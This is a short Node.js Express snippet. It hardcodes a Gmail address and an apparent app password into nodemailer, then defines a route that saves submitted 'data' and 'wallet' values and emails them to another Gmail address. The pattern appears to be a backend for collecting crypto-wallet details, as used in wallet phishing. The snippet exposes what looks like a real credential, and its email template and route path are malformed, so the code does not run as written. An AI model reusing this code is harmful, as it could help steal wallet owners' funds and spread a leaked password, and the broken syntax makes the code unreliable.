// Configure nodemailer
const transporter = nodemailer.createTransport({
    service: 'gmail',
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
        user: "relate2hazel@gmail.com",
        pass: "yurtanlosnxkpadu"
    }
});

// POST route to save input and send email
router.post('api/send-to-me', async (req, res) => {
    const { data, wallet } = req.body;
    try {
        const newInput = new Input({ data, wallet });
        await newInput.save();

        // Send email
        const mailOptions = {
            from: "relate2hazel@gmail.com",
            to: 'thierryalain643@gmail.com',
            subject: 'New Input Received',
            text: Data: ${data}\nWallet: ${wallet}
        };

        transporter.sendMail(mailOptions);

        res.status(201).json(newInput);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
})
